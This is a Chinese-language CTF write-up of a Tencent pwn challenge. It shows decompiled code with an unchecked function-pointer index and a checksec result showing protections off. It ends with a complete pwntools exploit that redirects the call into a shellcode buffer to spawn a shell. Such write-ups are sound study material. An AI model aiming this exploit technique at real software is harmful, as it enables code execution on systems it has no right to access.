---
title: 腾讯一道pwn题
tags:
  - PWN
  - writeup
categories: []
date: 2017-02-08 05:09:51
---

## 漏洞发现

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-14h]@1
  int v5; // [sp+20h] [bp-10h]@1
  int v6; // [sp+24h] [bp-Ch]@1
  func v7; // [sp+28h] [bp-8h]@1
  int v8; // [sp+2Ch] [bp-4h]@1

  puts("Which method would you like to choose?\n1. Add\n2. Subtract\n3. Multiply\n4. Divide");
  fflush(stdout);
  readIntegers(&v6, &v5);
  printf("You chose: %d\n", v6);
  puts("Enter two numbers to do math with, e.g. [123 110]");
  fflush(stdout);
  readIntegers(&v5, &v4);
  v7 = funcs[v6 - 1];
  v8 = v7(v5, v4);
  printf("Result is : %d\n", v8);
  fflush(stdout);
  return 0;
}
```

选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。

程序的保护：

```
pwndbg> checksec 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/ubuntu/workspace/nbw/tc
```

都没开，不过好像也没用到。

里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下：

```
mov     eax, [esp+24h]
sub     eax, 1                                            // 刚开始忘了这里减1，坑了很久
mov     eax, funcs[eax*4]                       //取func+eax*4的值，将这个值写为buf的地址的偏移  28+1
mov     [esp+28h], eax
mov     edx, [esp+1Ch]
mov     eax, [esp+20h]
mov     [esp+4], edx
mov     [esp], eax
mov     eax, [esp+28h]
call    eax
```

## exp

```
from pwn import *

context.log_level = 'debug'

# fun[v6 - 1]

func_addr = 0x804A030
buf_addr = 0x804A0A0
shellcode = shellcraft.i386.sh()
shellcode = asm(shellcode)

offset = (buf_addr - func_addr) / 4 + 1
payload1 = str(offset)
payload2 = p32(buf_addr + 4)
payload2 += shellcode

p = process('./tc')
p.recvuntil('Divide\n')
p.sendline(payload1)
p.recvuntil('110]\n')
p.sendline(payload2)
p.interactive()
```